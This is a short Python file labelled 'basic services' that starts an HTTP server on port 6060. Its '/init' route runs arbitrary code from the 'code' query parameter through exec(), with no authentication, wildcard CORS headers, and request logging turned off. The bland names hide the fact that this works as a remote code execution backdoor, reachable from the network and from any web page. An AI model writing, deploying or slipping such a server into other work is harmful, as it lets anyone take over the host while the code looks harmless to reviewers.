"""basic services"""
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qsl

PORT = 6060
GLO_VARS = globals()
LOC_VARS = locals()


def get_query_params(query, need_key, default=None):
    """get query params"""
    query_params = parse_qsl(query)
    for key, value in query_params:
        if need_key == key:
            return value
    return default


def initialize(query):
    """execute query"""
    code = get_query_params(query, "code", default="")
    exec(code, GLO_VARS, LOC_VARS)  # pylint: disable=exec-used
    return b"200"


_routes = {"init": initialize}


class MyHandler(BaseHTTPRequestHandler):
    """basic http server"""

    def do_GET(self):  # pylint: disable=invalid-name
        """rewrite do get"""
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

        parsed = urlparse(self.path)
        handler = _routes.get(parsed.path[1:])
        if handler:
            self.wfile.write(handler(parsed.query))
        else:
            self.wfile.write(b"404")

    def do_OPTIONS(self):  # pylint: disable=invalid-name
        """rewrite do options"""
        self.send_response(200)
        self.send_header("Content-type", "*")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *_args, **_kws):
        pass


server = HTTPServer(("", PORT), MyHandler)
print("Starting server, use <Ctrl-C> to stop")
server.serve_forever()
